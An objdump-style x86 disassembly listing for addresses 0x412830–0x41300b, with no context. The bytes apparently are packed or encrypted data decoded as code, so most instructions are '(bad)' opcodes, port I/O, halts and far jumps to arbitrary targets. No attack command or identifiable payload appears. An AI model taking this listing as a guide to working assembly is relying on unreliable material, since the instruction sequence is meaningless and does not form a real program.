  412830:	stos   DWORD PTR es:[edi],eax
  412831:	sbb    DWORD PTR [edi+0x2d],ecx
  412834:	mov    al,0x33
  412836:	xor    BYTE PTR [edi],0xd8
  412839:	(bad)  [edi+0x60f147d2]
  41283f:	rcr    BYTE PTR [ebx],1
  412841:	addr16 data16 rol bh,cl
  412845:	xor    DWORD PTR [eax+0x6c],0xc72c9a76
  41284c:	mov    cl,0x4b
  41284e:	and    BYTE PTR [ecx*1-0x15338e9],dl
  412855:	xor    al,0x86
  412857:	addr16 mov ds:0x2af2,eax
  41285b:	mov    dh,0xc5
  41285d:	lock popa 
  41285f:	mov    eax,0x57c77877
  412864:	push   ss
  412865:	stos   BYTE PTR es:[edi],al
  412866:	adc    eax,0xfa20062a
  41286b:	cmp    DWORD PTR [ebp+0x43],esi
  41286e:	ror    DWORD PTR [esi+0x291cdea2],1
  412874:	dec    edi
  412875:	add    al,0xf0
  412877:	or     al,0x6a
  412879:	cmp    DWORD PTR [edx+0x6ae294d8],ecx
  41287f:	stos   BYTE PTR es:[edi],al
  412880:	add    bl,bh
  412882:	std    
  412883:	mov    ds:0x243deb36,al
  412888:	(bad)
  41288d:	sub    dl,BYTE PTR [ecx-0xb]
  412890:	out    dx,al
  412891:	bound  ebx,QWORD PTR [ecx-0x43bd6a5b]
  412897:	jp     0x41290a
  412899:	cmp    al,0x1a
  41289b:	in     al,dx
  41289c:	jnp    0x412839
  41289e:	bnd js 0x412914
  4128a1:	in     al,dx
  4128a2:	sbb    al,BYTE PTR [eax]
  4128a4:	jmp    0xf015b179
  4128a9:	shr    DWORD PTR [eax],0x4a
  4128ac:	add    al,0xc7
  4128ae:	fwait
  4128af:	cs and al,0x2e
  4128b2:	sbb    eax,0xff145ee9
  4128b7:	dec    esp
  4128b8:	adc    al,0xaf
  4128ba:	call   0x2ae3d512
  4128bf:	pop    eax
  4128c0:	xchg   edi,eax
  4128c1:	mov    ebx,0xfbbf49fb
  4128c6:	(bad)
  4128c9:	add    DWORD PTR [ecx],esi
  4128cb:	shr    DWORD PTR [ecx+0x307d7911],0xde
  4128d2:	inc    ecx
  4128d3:	jne    0x412861
  4128d5:	mov    ds:0x6c3a007f,al
  4128da:	jae    0x4128de
  4128dc:	xor    DWORD PTR [edx-0xc],edx
  4128df:	push   0x3c
  4128e1:	sbb    edi,DWORD PTR [ecx+0x73581eb0]
  4128e7:	ret    0x1c
  4128ea:	aad    0x13
  4128ec:	jne    0x4128ee
  4128ee:	fisub  DWORD PTR ds:0xc8a9a40c
  4128f4:	les    ebp,FWORD PTR [ecx-0x801a1e1]
  4128fa:	bound  ecx,QWORD PTR [esi-0x58]
  4128fd:	in     al,0x31
  4128ff:	push   ecx
  412900:	or     dl,bl
  412902:	les    ebx,FWORD PTR [ecx+edx*2-0x6b3845d1]
  412909:	mov    BYTE PTR [ebx-0x8],al
  41290c:	popa   
  41290d:	pop    edi
  41290e:	fnstenv [edi+esi*2]
  412911:	push   cs
  412912:	test   DWORD PTR [ebp-0x6d],edx
  412915:	lea    esp,[eax-0x4f]
  412918:	out    0x58,eax
  41291a:	mov    ds:0x8ce65ad1,al
  41291f:	fs ins BYTE PTR es:[edi],dx
  412921:	jecxz  0x412981
  412923:	inc    esi
  412924:	sub    edx,esp
  412926:	sbb    DWORD PTR [ecx],0x90853ace
  41292c:	loopne 0x412959
  41292e:	adc    BYTE PTR [edx+0x2f],ah
  412931:	pop    ds
  412932:	inc    edx
  412933:	mov    bl,0x27
  412935:	jbe    0x412917
  412937:	scas   eax,DWORD PTR es:[edi]
  412938:	push   0x70
  41293a:	or     edi,ebp
  41293c:	repz bound esi,QWORD PTR [edi+ebx*2-0x5d12b5d9]
  412944:	sbb    ecx,DWORD PTR [edx-0x58bc8dff]
  41294a:	sbb    BYTE PTR [edx+0x6722b574],0xf3
  412951:	or     DWORD PTR [edi+0x9e02bb3],ebp
  412957:	out    0x58,al
  412959:	xor    al,0xfa
  41295b:	cmp    DWORD PTR [eax],esi
  41295d:	jge    0x412939
  41295f:	das    
  412960:	sbb    DWORD PTR [ebp-0x32bfe003],edx
  412966:	jg     0x4129e4
  412968:	push   ss
  412969:	sub    al,0x1d
  41296b:	sbb    dl,bh
  41296d:	aaa    
  41296e:	rcl    BYTE PTR [ecx-0xe3b385],1
  412974:	xchg   edx,eax
  412975:	imul   edx,DWORD PTR [ecx+0x58],0x35
  412979:	mov    dl,BYTE PTR [ebp-0x3c]
  41297c:	retf   
  41297d:	inc    edi
  41297e:	sub    eax,0x93237ea2
  412983:	icebp  
  412984:	xchg   ecx,eax
  412985:	mov    ax,0x663b
  412989:	inc    ecx
  41298a:	add    BYTE PTR [edi],dl
  41298c:	es in  eax,0x3b
  41298f:	add    BYTE PTR [esp+edx*1+0x56],ch
  412993:	sar    BYTE PTR [edx+0x6c],0x4e
  412997:	ror    BYTE PTR [edx],0x32
  41299a:	clc    
  41299b:	ja     0x412a14
  41299d:	push   es
  41299e:	xchg   ecx,eax
  41299f:	pop    es
  4129a0:	adc    eax,0x65d29f3e
  4129a5:	lock pop ss
  4129a7:	dec    edi
  4129a8:	dec    ecx
  4129a9:	push   0xfecc6099
  4129ae:	push   ds
  4129af:	pop    eax
  4129b0:	push   edx
  4129b1:	xchg   BYTE PTR [esi-0x1],bl
  4129b4:	rcl    ebp,cl
  4129b6:	bound  esp,QWORD PTR [ecx+0x1d]
  4129b9:	fmulp  st(4),st
  4129bb:	addr16 dec esi
  4129bd:	sub    BYTE PTR [ebx-0x498bc77c],ch
  4129c3:	les    esp,FWORD PTR [edx+0x1e]
  4129c6:	jle    0x4129e2
  4129c8:	sti    
  4129c9:	jmp    0x412978
  4129cb:	int    0x6c
  4129cd:	cmp    al,0x82
  4129cf:	add    edi,DWORD PTR [edx]
  4129d1:	inc    esi
  4129d2:	adc    cl,0x55
  4129d5:	jecxz  0x4129c6
  4129d7:	ds and al,0x8b
  4129da:	dec    esp
  4129db:	sahf   
  4129dc:	and    BYTE PTR [ecx],cl
  4129de:	xchg   edx,eax
  4129df:	jno    0x412a57
  4129e1:	cmp    al,0xc8
  4129e3:	int    0x73
  4129e5:	scas   al,BYTE PTR es:[edi]
  4129e6:	and    BYTE PTR [ecx+0x37],al
  4129e9:	in     al,dx
  4129ea:	test   al,0xf0
  4129ec:	xor    ax,0x9eb9
  4129f0:	stc    
  4129f1:	jnp    0x412a08
  4129f3:	mov    gs,edi
  4129f5:	test   eax,0xd9f3ff96
  4129fa:	call   0xc89b9dba
  4129ff:	push   edi
  412a00:	outs   dx,DWORD PTR ds:[esi]
  412a01:	aad    0xf1
  412a03:	mov    ah,0x4e
  412a05:	xor    eax,0x59a77450
  412a0a:	inc    esi
  412a0b:	adc    eax,0x9eb18f99
  412a10:	pop    ebp
  412a11:	test   DWORD PTR [ebx+0x18],ebp
  412a14:	mov    ecx,0x9acb8141
  412a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a1a:	jecxz  0x4129a5
  412a1c:	test   eax,0x14e53f
  412a21:	popa   
  412a22:	sub    BYTE PTR [eax+ebp*8+0x52],bl
  412a26:	mov    ecx,0x2fb9ede9
  412a2b:	out    0x70,eax
  412a2d:	mov    BYTE PTR [eax-0x38f35bb2],bl
  412a33:	jbe    0x4129d1
  412a35:	in     eax,0x9c
  412a37:	inc    esi
  412a38:	jmp    0x96bf8a59
  412a3d:	je     0x412a00
  412a3f:	enter  0x4e26,0xe0
  412a43:	(bad)  [esi-0x76]
  412a46:	in     eax,0x5b
  412a48:	arpl   si,ax
  412a4a:	mov    DWORD PTR [ebx+ebp*8],ebp
  412a4d:	jmp    0xdb4:0x61a43eee
  412a54:	and    ah,al
  412a56:	call   0xbbdb:0xba32e5f5
  412a5d:	or     bh,BYTE PTR [eax]
  412a5f:	daa    
  412a60:	fdivr  DWORD PTR [edx]
  412a62:	(bad)  
  412a63:	fmul   DWORD PTR [esi-0x6b]
  412a66:	mov    cl,0x75
  412a68:	sub    dh,0xef
  412a6b:	and    al,0xd2
  412a6d:	hlt    
  412a6e:	jno    0x4129f3
  412a70:	mov    ecx,esi
  412a72:	cmp    BYTE PTR [ebx+0xa9b8a39],bl
  412a78:	mov    ecx,0x8b410cc0
  412a7d:	dec    eax
  412a7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a7f:	leave  
  412a80:	imul   ebx,esi,0xd94432d2
  412a86:	and    eax,0x53
  412a89:	out    dx,al
  412a8a:	or     al,0xe6
  412a8c:	or     BYTE PTR [ecx+0x50325539],cl
  412a92:	stos   DWORD PTR es:[edi],eax
  412a93:	fsub   DWORD PTR [esi]
  412a95:	dec    eax
  412a96:	pop    ecx
  412a97:	fucomp st(1)
  412a99:	pop    edi
  412a9a:	add    ch,bl
  412a9c:	gs pop edi
  412a9e:	sbb    BYTE PTR [eax+0x57],0xf7
  412aa2:	cmp    eax,0x5d6859ac
  412aa7:	and    ebx,DWORD PTR [ebx-0x3e]
  412aaa:	pop    es
  412aab:	sbb    BYTE PTR ds:0x5f9e47b4,ah
  412ab1:	inc    eax
  412ab2:	inc    esi
  412ab3:	or     al,0x1e
  412ab5:	mov    dl,0x23
  412ab7:	sub    cl,ah
  412ab9:	add    al,0x2f
  412abb:	retf   
  412abc:	scas   al,BYTE PTR es:[edi]
  412abd:	shl    al,cl
  412abf:	push   ebx
  412ac0:	dec    ebx
  412ac1:	mov    dl,0xee
  412ac3:	clc    
  412ac4:	xchg   esi,eax
  412ac5:	push   ebx
  412ac6:	cli    
  412ac7:	lods   eax,DWORD PTR ds:[si]
  412ac9:	rcr    bl,0x56
  412acc:	push   0xffffffb2
  412ace:	mov    ch,BYTE PTR [eax-0x687775c4]
  412ad4:	ins    BYTE PTR es:[edi],dx
  412ad5:	sahf   
  412ad6:	xor    esi,edi
  412ad8:	nop
  412ad9:	sbb    edx,DWORD PTR [eax+0x34458aa7]
  412adf:	jp     0x412aeb
  412ae1:	and    bh,BYTE PTR [esi-0x56d7caab]
  412ae7:	into   
  412ae8:	pop    esp
  412ae9:	test   DWORD PTR ds:0x6943400f,esp
  412aef:	lds    esp,FWORD PTR [edi+0x7de30414]
  412af5:	xchg   ecx,eax
  412af6:	xchg   BYTE PTR [ebx+edi*2],dl
  412af9:	frstor [edi]
  412afb:	cwde   
  412afc:	dec    ebp
  412afd:	jno    0x412aef
  412aff:	pop    ebx
  412b00:	push   es
  412b01:	arpl   WORD PTR [ebp+0x30c98103],dx
  412b07:	add    cl,BYTE PTR [ebp-0x1f]
  412b0a:	aam    0x4f
  412b0c:	cmp    al,0x8a
  412b0e:	retf   
  412b0f:	dec    ebp
  412b10:	mov    ebx,0x456e893c
  412b15:	sub    BYTE PTR [ebx-0x3],al
  412b18:	lods   al,BYTE PTR ds:[esi]
  412b19:	(bad)  
  412b1a:	addr16 push ebp
  412b1c:	clc    
  412b1d:	push   cs
  412b1e:	mov    BYTE PTR [edx-0xff5e05d],ah
  412b24:	inc    esp
  412b25:	pop    ebp
  412b26:	sbb    dl,bh
  412b28:	sub    eax,0xaf6f96c2
  412b2d:	sub    eax,0xff7f0ab9
  412b32:	mov    ah,0x1c
  412b34:	mov    cl,0x52
  412b36:	pop    ecx
  412b37:	scas   eax,DWORD PTR es:[edi]
  412b38:	jg     0x412b00
  412b3a:	cmp    al,0xad
  412b3c:	cmp    eax,0x243b141c
  412b41:	add    BYTE PTR [eax],0x67
  412b44:	push   esi
  412b45:	mov    edx,0xe87bfec8
  412b4a:	push   ebx
  412b4b:	inc    eax
  412b4c:	cmp    DWORD PTR [ebx],ebx
  412b4e:	cmc    
  412b4f:	sub    DWORD PTR ds:0x1c789844,edx
  412b55:	dec    ebx
  412b56:	push   ax
  412b58:	cmp    al,0xd1
  412b5a:	add    ebp,eax
  412b5c:	(bad)  
  412b5e:	cmp    al,0xb3
  412b60:	push   cs
  412b61:	inc    ebx
  412b62:	pop    edi
  412b63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b64:	inc    ebx
  412b65:	sbb    DWORD PTR [esi-0x55],esp
  412b68:	ror    DWORD PTR [edi],0xa1
  412b6b:	jp     0x412b70
  412b6d:	and    al,0x95
  412b6f:	hlt    
  412b70:	fwait
  412b71:	(bad)  
  412b72:	(bad)  
  412b73:	adc    BYTE PTR [edx+0x470bd681],bh
  412b79:	or     DWORD PTR [ecx-0x3a],esi
  412b7c:	and    esi,DWORD PTR [esi]
  412b7e:	mov    ss,edx
  412b80:	sub    eax,0xdac33ad7
  412b85:	jae    0x412b6e
  412b87:	inc    esp
  412b88:	stos   DWORD PTR es:[edi],eax
  412b89:	rol    DWORD PTR [eax-0x27ef4fbe],0xc2
  412b90:	add    eax,0xab6f3f1e
  412b95:	jecxz  0x412b7c
  412b97:	cs jnp 0x412b9f
  412b9a:	(bad)  
  412b9c:	out    dx,al
  412b9d:	and    ecx,DWORD PTR [edi-0x4647ffa2]
  412ba3:	pop    ecx
  412ba4:	in     eax,dx
  412ba5:	ins    BYTE PTR es:[edi],dx
  412ba6:	dec    eax
  412ba7:	out    0xe0,al
  412ba9:	mov    esp,0xb3003122
  412baf:	xchg   ecx,eax
  412bb0:	fsubr  st(4),st
  412bb2:	inc    DWORD PTR [edx+0x29]
  412bb5:	sub    dl,ah
  412bb7:	dec    esp
  412bb8:	(bad)  
  412bb9:	or     eax,0x3a748ffb
  412bbe:	enter  0x5d85,0xe1
  412bc2:	lods   al,BYTE PTR ds:[esi]
  412bc3:	inc    edx
  412bc4:	inc    eax
  412bc5:	(bad)  
  412bc6:	dec    ebx
  412bc7:	imul   ebx,edi,0x43
  412bca:	cli    
  412bcb:	(bad)  
  412bcc:	arpl   WORD PTR [edx],cx
  412bce:	fadd   DWORD PTR [esi]
  412bd0:	mov    dl,0x4b
  412bd2:	out    dx,eax
  412bd3:	sbb    eax,0xa9f7efc6
  412bd8:	pop    ds
  412bd9:	push   edx
  412bda:	xlat   BYTE PTR ds:[ebx]
  412bdb:	push   cs
  412bdc:	ins    BYTE PTR es:[edi],dx
  412bdd:	push   ds
  412bde:	inc    ebp
  412bdf:	retf   
  412be0:	add    al,0x84
  412be2:	cmp    ah,BYTE PTR [esi+edi*1]
  412be5:	jmp    0xf112cee4
  412bea:	jb     0x412c06
  412bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bed:	and    dh,dl
  412bef:	sub    esp,DWORD PTR ds:0x3dc29041
  412bf5:	xchg   ebx,eax
  412bf6:	or     esi,0xfffffff0
  412bf9:	dec    edx
  412bfa:	mov    bh,BYTE PTR [edi+0x5d]
  412bfd:	(bad)  
  412bfe:	imul   BYTE PTR [ebp+0x2014b906]
  412c04:	dec    ecx
  412c05:	jmp    0x1f86a572
  412c0a:	mov    ebp,ebp
  412c0c:	call   0xa39e9138
  412c11:	pop    es
  412c12:	mov    eax,0x633b7abb
  412c17:	shl    ah,0xb2
  412c1a:	dec    edi
  412c1b:	mov    ch,0xb2
  412c1d:	cmp    ch,BYTE PTR [edi-0x6b822379]
  412c23:	es cmp edx,ecx
  412c26:	or     dh,ah
  412c28:	sbb    ah,BYTE PTR [eax+0x3ff3103a]
  412c2e:	push   esp
  412c2f:	scas   eax,DWORD PTR es:[edi]
  412c30:	out    0x99,eax
  412c32:	js     0x412bb9
  412c34:	jge    0x412c5d
  412c36:	mov    esp,0x264e7098
  412c3b:	inc    eax
  412c3c:	sbb    eax,0x5e76c849
  412c41:	loop   0x412bee
  412c43:	and    ah,ah
  412c45:	or     al,BYTE PTR [ebp-0x78c7e34e]
  412c4b:	inc    ebx
  412c4c:	(bad)  
  412c4d:	call   0xbed188c
  412c52:	mov    ds:0x73b6cb01,eax
  412c57:	add    BYTE PTR [esi],0xb3
  412c5a:	mov    ebx,0x51d97142
  412c5f:	and    al,0x99
  412c61:	fild   DWORD PTR [esi+0x6818f97c]
  412c67:	jmp    0x432e:0xac3257ef
  412c6e:	fld    st(1)
  412c70:	jmp    0x412cd3
  412c72:	loope  0x412cd2
  412c74:	ins    BYTE PTR es:[edi],dx
  412c75:	pop    ebp
  412c76:	mov    eax,0x7344cf5d
  412c7b:	add    edx,ebp
  412c7d:	sub    BYTE PTR [edx-0x45],0x89
  412c81:	addr16 mov ebp,0x429983d1
  412c87:	lods   eax,DWORD PTR ds:[esi]
  412c88:	push   esi
  412c89:	mov    bh,0x99
  412c8b:	sub    al,ch
  412c8d:	jmp    0x656e:0x4eaed686
  412c94:	iret   
  412c95:	dec    esi
  412c96:	xor    edi,edi
  412c98:	test   BYTE PTR [eax-0x27d3eee0],bh
  412c9e:	gs jecxz 0x412d13
  412ca1:	jg     0x412c4c
  412ca3:	fbstp  TBYTE PTR [edx]
  412ca5:	xor    BYTE PTR [ebp+0x5c],cl
  412ca8:	(bad)  
  412ca9:	fistp  WORD PTR [ecx]
  412cab:	or     ecx,DWORD PTR [ebp-0x1c]
  412cae:	mov    dl,0xe4
  412cb0:	dec    esp
  412cb1:	(bad)  
  412cb2:	ficomp WORD PTR [edx+0x582e773]
  412cb8:	xchg   ebx,eax
  412cb9:	sahf   
  412cba:	xchg   esi,eax
  412cbb:	cli    
  412cbc:	sub    dh,BYTE PTR [ebp+ebx*1-0x60]
  412cc0:	xchg   DWORD PTR [edi],edx
  412cc2:	mov    ah,0x28
  412cc4:	push   eax
  412cc5:	pusha  
  412cc6:	jl     0x412d0a
  412cc8:	dec    ebp
  412cc9:	pusha  
  412cca:	call   0xcac7:0xde327c7b
  412cd1:	sbb    ebx,ecx
  412cd3:	ins    DWORD PTR es:[edi],dx
  412cd4:	sub    al,0x46
  412cd6:	sar    DWORD PTR [edi-0x70],0x21
  412cda:	sar    BYTE PTR [eax],cl
  412cdc:	adc    ah,BYTE PTR [esi+0x6d]
  412cdf:	das    
  412ce0:	outs   dx,BYTE PTR ds:[esi]
  412ce1:	dec    esi
  412ce2:	(bad)  
  412ce3:	aam    0x21
  412ce5:	js     0x412d59
  412ce7:	cli    
  412ce8:	jmp    0x41c1140f
  412ced:	sbb    al,0x68
  412cef:	dec    edx
  412cf0:	dec    ebx
  412cf1:	mov    ebx,DWORD PTR [ecx]
  412cf3:	adc    BYTE PTR [edi],0x4f
  412cf6:	test   eax,0x6e822c4d
  412cfb:	or     edx,DWORD PTR [ecx]
  412cfd:	xchg   ecx,eax
  412cfe:	test   DWORD PTR [ebp+0x69],0xa5b0c9ef
  412d05:	js     0x7229bbdb
  412d0b:	sbb    DWORD PTR [ecx-0x2a],ebx
  412d0e:	and    al,dh
  412d10:	add    DWORD PTR [esi-0x59],ebp
  412d13:	dec    eax
  412d14:	fwait
  412d15:	jno    0x412d5b
  412d17:	loop   0x412d56
  412d19:	bound  ebp,QWORD PTR [ebx]
  412d1b:	xchg   edx,eax
  412d1c:	inc    esp
  412d1d:	stos   DWORD PTR es:[edi],eax
  412d1e:	cwde   
  412d1f:	fs repnz sbb eax,0x1367fe31
  412d26:	xor    eax,0xaa6eeb2c
  412d2b:	out    0x63,eax
  412d2d:	fmul   DWORD PTR [bp-0xe]
  412d31:	imul   esp,DWORD PTR [ecx-0x53],0x30d590bd
  412d38:	neg    bh
  412d3a:	loopne 0x412ced
  412d3c:	retf   0xc912
  412d3f:	hlt    
  412d40:	mov    BYTE PTR [edx],al
  412d42:	imul   ebp,edx,0xffffffc1
  412d45:	dec    eax
  412d46:	idiv   BYTE PTR [ebx]
  412d48:	outs   dx,DWORD PTR ds:[esi]
  412d49:	pop    edx
  412d4a:	popa   
  412d4b:	add    edi,edi
  412d4d:	fcomp  QWORD PTR [edx]
  412d4f:	mov    dh,0x35
  412d51:	xchg   esp,eax
  412d52:	inc    esi
  412d53:	push   eax
  412d54:	sub    eax,0x5740e757
  412d59:	mov    esi,0xd20d6ab8
  412d5e:	and    dh,bl
  412d60:	fscale 
  412d62:	mul    BYTE PTR [esi+0x34012206]
  412d68:	test   al,dl
  412d6a:	xchg   al,ch
  412d6c:	gs fmul st(3),st
  412d6f:	ret    0x2676
  412d72:	xchg   DWORD PTR [edi+0x25],esi
  412d75:	mov    esi,DWORD PTR [esi+0xf]
  412d78:	jb     0x412d3e
  412d7a:	sahf   
  412d7b:	dec    edi
  412d7c:	ja     0x412d5a
  412d7e:	xchg   esi,eax
  412d7f:	rol    DWORD PTR [esi+0x28],0xe7
  412d83:	xchg   ecx,eax
  412d84:	test   BYTE PTR [eax+0x316710c2],0x48
  412d8b:	icebp  
  412d8c:	cmc    
  412d8d:	outs   dx,DWORD PTR ds:[esi]
  412d8e:	stc    
  412d8f:	loopne 0x412db3
  412d91:	push   ss
  412d92:	aam    0x2d
  412d94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d95:	aaa    
  412d96:	(bad)  
  412d97:	mov    DWORD PTR [ecx-0x46f179ab],ecx
  412d9d:	push   0x4d
  412d9f:	mov    ecx,0x779412f7
  412da4:	sbb    BYTE PTR [ecx],0xae
  412da7:	or     ax,0x1afd
  412dab:	sbb    ebp,DWORD PTR [ecx+0x1732c8c6]
  412db1:	fadd   DWORD PTR [ebx+0x5b]
  412db4:	ins    BYTE PTR es:[edi],dx
  412db5:	mov    es,eax
  412db7:	jg     0x412d75
  412db9:	popf   
  412dba:	mov    edx,0xd41d30a
  412dbf:	lea    esp,ss:[ebx-0x2fda8232]
  412dc6:	scas   al,BYTE PTR es:[edi]
  412dc7:	das    
  412dc8:	mov    ds:0x51532e28,al
  412dcd:	xor    BYTE PTR gs:[ebp-0x7e],0x65
  412dd2:	dec    eax
  412dd3:	push   ebp
  412dd4:	sub    al,0x47
  412dd6:	fidivr DWORD PTR [ebp+0x6007d2d9]
  412ddc:	mov    ebx,0x30f24cfa
  412de1:	and    al,0xab
  412de3:	xor    DWORD PTR ds:[edi],ecx
  412de6:	push   edi
  412de7:	mov    ds:0x444f6028,eax
  412dec:	cmp    eax,0xb25bf453
  412df1:	dec    esp
  412df2:	ja     0x412e49
  412df4:	jmp    0x412d8a
  412df6:	inc    ebp
  412df7:	xchg   esi,eax
  412df8:	adc    ch,cl
  412dfa:	sbb    al,0xde
  412dfc:	test   BYTE PTR [eax-0x7cf414ab],bl
  412e02:	jbe    0x412d9d
  412e04:	arpl   WORD PTR [ecx+eiz*4-0x2d2edffe],si
  412e0b:	or     eax,0xf53c0672
  412e10:	int    0x32
  412e12:	sub    BYTE PTR [edx+0x5a],ch
  412e15:	in     eax,0xc2
  412e17:	and    al,0x8b
  412e19:	stc    
  412e1a:	jae    0x412e62
  412e1c:	inc    edx
  412e1d:	cmp    eax,0x91a5499e
  412e22:	jbe    0x412e10
  412e24:	pop    eax
  412e25:	out    dx,eax
  412e26:	add    esp,DWORD PTR ss:0xac5058ea
  412e2d:	and    eax,0xd56a6e0a
  412e32:	(bad)  
  412e33:	pop    ecx
  412e34:	test   eax,0x63d6a105
  412e39:	adc    eax,0x9eb024c1
  412e3e:	jl     0x412e0b
  412e40:	and    BYTE PTR [esi-0x5b82011],cl
  412e46:	mov    al,ds:0x3977c4b0
  412e4b:	mov    esp,0xcf0ddb9c
  412e50:	cmc    
  412e51:	xchg   ecx,eax
  412e52:	mov    BYTE PTR [eax-0x616a348d],ah
  412e58:	push   esp
  412e59:	fcomip st,st(6)
  412e5b:	xbegin 0xe1e1f5bd
  412e61:	jno    0x412e67
  412e63:	dec    ebp
  412e64:	xchg   ecx,eax
  412e65:	add    BYTE PTR [eax+0x2c4497ee],dl
  412e6b:	bound  esp,QWORD PTR [esi+0x41]
  412e6e:	xchg   ebp,eax
  412e6f:	jge    0x412dfb
  412e71:	(bad)  
  412e72:	mov    esp,0xa94a8f56
  412e77:	loop   0x412e5a
  412e79:	ds cmp bh,dh
  412e7c:	retf   0x9599
  412e7f:	xchg   esp,eax
  412e80:	sbb    BYTE PTR [ebp+0x9473d61],dh
  412e86:	vpmuludq ymm6,ymm0,YMMWORD PTR [ebx-0x31156cf4]
  412e8e:	mov    ecx,0xe541c5b1
  412e93:	adc    DWORD PTR [edx],ecx
  412e95:	test   al,0x59
  412e97:	sbb    DWORD PTR [ecx],ebp
  412e99:	nop
  412e9a:	cmp    BYTE PTR [edi+0x53],0x36
  412e9e:	icebp  
  412e9f:	stc    
  412ea0:	pusha  
  412ea1:	imul   esp,DWORD PTR [ebx],0xa8b43d6d
  412ea7:	mov    gs,WORD PTR [eax]
  412ea9:	outs   dx,BYTE PTR ds:[esi]
  412eaa:	add    edi,ebp
  412eac:	sahf   
  412ead:	lds    ebp,FWORD PTR [edi-0x15b9f09b]
  412eb3:	loop   0x412e3b
  412eb5:	xchg   ebp,eax
  412eb6:	ret    0xbc8d
  412eb9:	dec    eax
  412eba:	push   esi
  412ebb:	cld    
  412ebc:	pushf  
  412ebd:	mov    dh,0x18
  412ebf:	mov    al,cl
  412ec1:	cmp    esi,ebx
  412ec3:	stos   BYTE PTR es:[edi],al
  412ec4:	test   ah,bh
  412ec6:	add    BYTE PTR [ebx],cl
  412ec8:	cmc    
  412ec9:	jecxz  0x412f42
  412ecb:	sub    bh,BYTE PTR [edi]
  412ecd:	iret   
  412ece:	or     eax,DWORD PTR [esi+0x13]
  412ed1:	push   eax
  412ed2:	aas    
  412ed3:	xchg   edx,eax
  412ed4:	dec    eax
  412ed5:	and    al,0x97
  412ed7:	or     eax,0x755bac25
  412edc:	push   0x93c41f2
  412ee1:	mov    edi,0xb25e4aa6
  412ee6:	inc    DWORD PTR [esi+0x15916e0]
  412eec:	idiv   BYTE PTR [eax]
  412eee:	sub    al,BYTE PTR [eax+0x1ad87793]
  412ef4:	and    cl,BYTE PTR [edi]
  412ef6:	xchg   edx,esi
  412ef8:	in     eax,dx
  412ef9:	mov    ds:0x64604321,eax
  412efe:	jle    0x412f75
  412f00:	pop    edx
  412f01:	shl    ah,cl
  412f03:	add    bl,cl
  412f05:	pop    eax
  412f07:	(bad)  [esi-0x554299e1]
  412f0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f0e:	mov    esp,0x2d676bfe
  412f13:	cmp    BYTE PTR [esi],ch
  412f15:	jo     0x412f1e
  412f17:	into   
  412f18:	scas   al,BYTE PTR es:[edi]
  412f19:	mov    dh,0xed
  412f1b:	loope  0x412ece
  412f1d:	mov    dh,0xa7
  412f1f:	xlat   BYTE PTR ds:[ebx]
  412f20:	iret   
  412f21:	mov    dl,BYTE PTR [esp+esi*1]
  412f24:	call   0x4fd6:0x93cf17a7
  412f2b:	cmp    eax,0xb300579d
  412f30:	mov    esp,0xc3f612fd
  412f35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f36:	popa   
  412f37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f38:	pop    eax
  412f39:	in     al,dx
  412f3a:	clc    
  412f3b:	sub    dh,BYTE PTR [esi-0x42]
  412f3e:	inc    eax
  412f3f:	sub    al,0x62
  412f41:	dec    ecx
  412f42:	lock pop esp
  412f44:	sar    DWORD PTR [edi+0x6fb956f0],1
  412f4a:	movsx  esp,WORD PTR [edx-0x753d5be0]
  412f51:	jnp    0x412f28
  412f53:	jb     0x412f1b
  412f55:	std    
  412f56:	mov    ebx,0x7f351208
  412f5b:	repz jo 0x412f0c
  412f5e:	push   ds
  412f5f:	inc    ebp
  412f60:	xchg   DWORD PTR [esi-0xb],esi
  412f63:	cwde   
  412f64:	jmp    0x79fa717f
  412f69:	or     DWORD PTR [ecx],ecx
  412f6b:	mov    esi,0x45f56917
  412f70:	out    dx,eax
  412f71:	es sub edi,esp
  412f74:	fwait
  412f75:	or     al,BYTE PTR [esi]
  412f77:	and    al,0x2c
  412f79:	mov    eax,0x9aadf0ce
  412f7e:	xchg   edi,eax
  412f7f:	jmp    0x8d6c900
  412f84:	jecxz  0x412f95
  412f86:	imul   esp,DWORD PTR [ecx+0x3],0xffffffd1
  412f8a:	or     DWORD PTR cs:[edi+ebp*1],esp
  412f8e:	sub    eax,0x44576e60
  412f93:	imul   eax,ebx,0x2d67bb26
  412f99:	dec    edi
  412f9a:	xor    DWORD PTR [ebp+0x1e],esp
  412f9d:	fld    QWORD PTR [edi+0x34]
  412fa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fa1:	nop
  412fa2:	arpl   WORD PTR [ebx],bx
  412fa4:	not    DWORD PTR [esi+0x46]
  412fa7:	inc    ebp
  412fa8:	xor    BYTE PTR [esi+0x39],bl
  412fab:	push   0x61
  412fad:	jl     0x412f83
  412faf:	fs hlt 
  412fb1:	mov    ebp,0x6094dac4
  412fb6:	xchg   edi,eax
  412fb7:	jl     0x412fa3
  412fb9:	push   cs
  412fba:	xchg   esi,eax
  412fbb:	dec    ebx
  412fbc:	retf   0x8758
  412fbf:	not    BYTE PTR [ebx]
  412fc1:	mov    dh,0x93
  412fc3:	mov    eax,0x372ce52a
  412fc8:	ret    0x3b6
  412fcb:	icebp  
  412fcc:	in     al,0xb4
  412fce:	mov    edi,0xc0c5b70d
  412fd3:	mov    ebp,0xea939eeb
  412fd8:	out    0x1e,al
  412fda:	and    eax,0xed9ca513
  412fdf:	shr    DWORD PTR [edx-0x65],cl
  412fe2:	and    BYTE PTR [esi],0x4a
  412fe5:	test   al,0xbd
  412fe7:	mov    edi,0x89a49986
  412fec:	jecxz  0x41303a
  412fee:	sbb    BYTE PTR [ecx+edi*8+0x46d542a0],ah
  412ff5:	push   ds
  412ff6:	les    eax,FWORD PTR [ecx]
  412ff8:	repz sbb eax,DWORD PTR [edi+0x61]
  412ffc:	push   edi
  412ffd:	jns    0x412fe5
  412fff:	mov    bl,0xfd
  413001:	hlt    
  413002:	xchg   esp,eax
  413003:	dec    eax
  413004:	sub    eax,0x8ddf7c0
  413009:	lods   al,BYTE PTR ds:[esi]
  41300a:	cdq    
  41300b:	cmp    al,0x7
